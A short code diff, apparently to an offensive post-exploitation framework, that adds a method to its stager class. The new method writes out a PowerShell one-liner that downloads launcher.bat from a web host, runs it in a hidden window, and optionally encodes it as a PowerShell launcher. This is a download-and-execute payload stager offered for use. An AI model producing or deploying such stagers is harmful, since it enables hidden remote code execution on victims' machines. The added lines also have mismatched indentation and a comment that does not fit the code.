@@ -277,6 +277,13 @@ class Stagers:
 
         return server + checksum
 
+    def generate_launcher_fetcher(self, encode=True, webFile='http://127.0.0.1/launcher.bat'):
+        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
+	if encode:
+            return helpers.powershell_launcher(stager)
+        else:
+            # otherwise return the case-randomized stager
+            return stager
 
     def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default", stagerRetries="0"):
         """
